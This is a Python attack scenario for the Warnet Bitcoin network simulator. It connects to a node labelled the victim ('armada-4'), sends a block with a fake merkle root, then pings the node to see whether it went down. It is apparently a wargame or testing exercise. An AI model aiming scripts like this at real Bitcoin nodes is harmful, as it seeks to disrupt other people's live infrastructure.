#!/usr/bin/env python3

import socket
import time

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    msg_block,
    msg_ping,
)
from test_framework.p2p import P2PInterface

from test_framework.blocktools import create_block, create_coinbase


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class InvalidBlock(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = "Send an invalid block to a node"
        parser.usage = "warnet run  v98_invalid_bloc.py --debug"

    def get_node(self) : 
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node

    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        if node is None:
            self.log.error("No working nodes found!")
            return

        def get_msg(message):
            if message:
                [print(f"Peer: {addr.ip}, Port: {addr.port}") for addr in message.addrs]

        victim = "armada-4"

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        best_block_hash = node.getbestblockhash()
        best_block = node.getblock(best_block_hash)
        best_block_time = best_block["time"]
        coinbase = create_coinbase(height=123)
        new_block = create_block(
            hashprev=int(best_block_hash, 16),
            coinbase=coinbase,
            ntime=best_block_time + 1,
        )
        # new_block.solve()
        new_block.hashMerkleRoot = 0xDEADBEEF
        msg = msg_block(new_block)

        # DEAR HACKERS: The invalid block msg has been made, send it now!
        attacker.send_message(msg)

        try:
            ping = msg_ping()
            ping_count = 0
            while ping_count < 10:
                self.log.info(f"Ping: {ping_count + 1}")
                attacker.send_message(ping)
                ping_count += 1

        except:
            self.log.info(f"It was not possible to communicate with {victim}!")
            self.log.info(f"Ping count: {attacker.ping_counter}")
            self.log.info(f"Attack successfully completed!")


def main():
    InvalidBlock().main()


if __name__ == "__main__":
    main()
